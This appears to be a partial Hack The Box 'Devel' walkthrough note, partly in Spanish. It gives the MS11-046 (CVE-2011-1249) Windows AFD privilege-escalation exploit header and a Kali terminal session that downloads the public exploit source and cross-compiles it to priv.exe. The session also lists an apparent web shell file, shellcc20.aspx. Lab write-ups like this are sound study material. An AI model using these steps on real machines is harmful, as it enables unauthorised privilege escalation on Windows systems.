@@ -1,0 +1,92 @@
+################################################################
+# Exploit Title: Windows x86 (all versions) AFD privilege escalation (MS11-046)
+# Date: 2016-10-16
+# Exploit Author: Tomislav Paskalev
+# Vulnerable Software:
+#   Windows XP SP3 x86
+#   Windows XP Pro SP2 x64
+#   Windows Server 2003 SP2 x86
+#   Windows Server 2003 SP2 x64
+#   Windows Server 2003 SP2 Itanium-based Systems 
+#   Windows Vista SP1 x86
+#   Windows Vista SP2 x86
+#   Windows Vista SP1 x64
+#   Windows Vista SP2 x64
+#   Windows Server 2008 x86
+#   Windows Server 2008 SP2 x86
+#   Windows Server 2008 x64
+#   Windows Server 2008 SP2 x64
+#   Windows Server 2008 Itanium-based Systems
+#   Windows Server 2008 SP2 Itanium-based Systems
+#   Windows 7 x86
+#   Windows 7 SP1 x86
+#   Windows 7 x64
+#   Windows 7 SP1 x64
+#   Windows Server 2008 R2 x64
+#   Windows Server 2008 R2 SP1 x64
+#   Windows Server 2008 R2 Itanium-based Systems
+#   Windows Server 2008 R2 SP1 Itanium-based Systems
+# Supported Vulnerable Software:
+#   Windows XP SP3 x86
+#   Windows Server 2003 SP2 x86
+#   Windows Vista SP1 x86
+#   Windows Vista SP2 x86
+#   Windows Server 2008 x86
+#   Windows Server 2008 SP2 x86
+#   Windows 7 x86
+#   Windows 7 SP1 x86
+# Tested Software:
+#   Windows XP Pro SP3 x86 EN          [5.1.2600]
+#   Windows Server 2003 Ent SP2 EN     [5.2.3790]
+#   Windows Vista Ult SP1 x86 EN       [6.0.6001]
+#   Windows Vista Ult SP2 x86 EN       [6.0.6002]
+#   Windows Server 2008 Dat SP1 x86 EN [6.0.6001]
+#   Windows Server 2008 Ent SP2 x86 EN [6.0.6002]
+#   Windows 7 HB x86 EN                [6.1.7600]
+#   Windows 7 Ent SP1 x86 EN           [6.1.7601]
+# CVE ID: 2011-1249
+
+
+https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/40564.c
+
+
+
+
+
+
+──(root㉿kali)-[/home/…/Documents/htb/Devel/exploits]
+└─# wget https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/40564.c
+--2024-05-25 11:43:30--  https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/40564.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31866 (31K) [text/plain]
+Saving to: ‘40564.c’
+
+40564.c                 100%[===============================>]  31.12K  --.-KB/s    in 0.001s  
+
+2024-05-25 11:43:30 (21.9 MB/s) - ‘40564.c’ saved [31866/31866]
+
+                                                                                                
+┌──(root㉿kali)-[/home/…/Documents/htb/Devel/exploits]
+└─# ls
+40564.c  shellcc20.aspx
+
+**************COMPILADOR DE C A EXE****************
+
+                                                                                                
+┌──(root㉿kali)-[/home/…/Documents/htb/Devel/exploits]
+└─# i686-w64-mingw32-gcc 40564.c -o priv.exe -lws2_32
+
+El comando que has proporcionado está utilizando el compilador i686-w64-mingw32-gcc para compilar un archivo fuente en C (40564.c) en un ejecutable (priv.exe). Aquí hay un desglose de cada parte del comando:
+
+i686-w64-mingw32-gcc: Este es un compilador cruzado que se usa para compilar programas para sistemas Windows desde un entorno Linux. El prefijo i686-w64-mingw32- indica que el objetivo es una arquitectura de 32 bits de Windows.
+
+40564.c: Es el archivo fuente en lenguaje C que se va a compilar.
+
+-o priv.exe: Esta opción especifica el nombre del archivo de salida, en este caso priv.exe, que será el ejecutable generado.
+
+-lws2_32: Esta opción le dice al compilador que enlace la librería ws2_32, que es la librería de Windows Sockets 2.0, necesaria para programas que usan funciones de red en Windows.
+
+El comando completo está compilando el código fuente 40564.c en un ejecutable de Windows llamado priv.exe, asegurándose de enlazar la librería de sockets necesaria para la funcionalidad de red. Este tipo de compilación es común en entornos de pruebas de penetración y desarrollo de exploits para generar ejecutables que se ejecutarán en sistemas Windows.
+
